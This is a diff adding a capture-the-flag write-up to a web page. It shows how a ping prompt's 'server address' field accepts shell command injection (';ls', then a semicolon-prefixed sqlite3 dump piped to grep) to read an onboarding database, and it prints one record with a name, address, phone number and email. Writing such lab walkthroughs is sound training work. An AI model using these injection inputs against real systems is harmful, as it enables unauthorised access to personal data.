@@ -201,6 +201,33 @@ To solve this challenge, determine the new worker&#39;s first name and submit to
 Please make a selection:
 </pre></div>
 </div>
+<p>After typing <code class="docutils literal notranslate"><span class="pre">2</span></code> the following appears <a class="footnote-reference" href="#f1" id="id1">[1]</a> :</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Validating data store for employee onboard information.
+Enter address of server:
+</pre></div>
+</div>
+<p>We observed that if you type <code class="docutils literal notranslate"><span class="pre">;ls</span></code> it works as a normal shell.</p>
+<p>We see that the following items appear: <code class="docutils literal notranslate"><span class="pre">menu.ps1</span></code>, <code class="docutils literal notranslate"><span class="pre">onboard.db</span></code> and <code class="docutils literal notranslate"><span class="pre">runtoanswer</span></code>.
+Therefore, by using <code class="docutils literal notranslate"><span class="pre">;</span> <span class="pre">/usr/bin/sqlite3</span> <span class="pre">onboard.db</span> <span class="pre">.dump</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">'Chan'</span></code> we get:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Validating data store for employee onboard information.
+Enter address of server: ; /usr/bin/sqlite3 onboard.db .dump | grep &#39;Chan&#39;
+Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
+            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
+            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
+            [-w deadline] [-W timeout] [hop1 ...] destination
+INSERT INTO &quot;onboard&quot; VALUES(84,&#39;Scott&#39;,&#39;Chan&#39;,&#39;48 Colorado Way&#39;,NULL,&#39;Los Angeles&#39;,&#39;90067&#39;,&#39;4017533509&#39;,&#39;scottmchan90067@gmail.com&#39;);
+onboard.db: SQLite 3.x database
+Press Enter to continue...:
+</pre></div>
+</div>
+<p>Therefore mr Chan’s name is Scott.</p>
+<p class="rubric">Extra Info</p>
+<table class="docutils footnote" frame="void" id="f1" rules="none">
+<colgroup><col class="label" /><col /></colgroup>
+<tbody valign="top">
+<tr><td class="label"><a class="fn-backref" href="#id1">[1]</a></td><td>After typing <code class="docutils literal notranslate"><span class="pre">1</span></code> we were taken to a registration page, which made us lose some time by trying to use that to solve the challenge. By typing <code class="docutils literal notranslate"><span class="pre">q</span></code> one cannot type anything more.</td></tr>
+</tbody>
+</table>
 </div>
 </div>
 
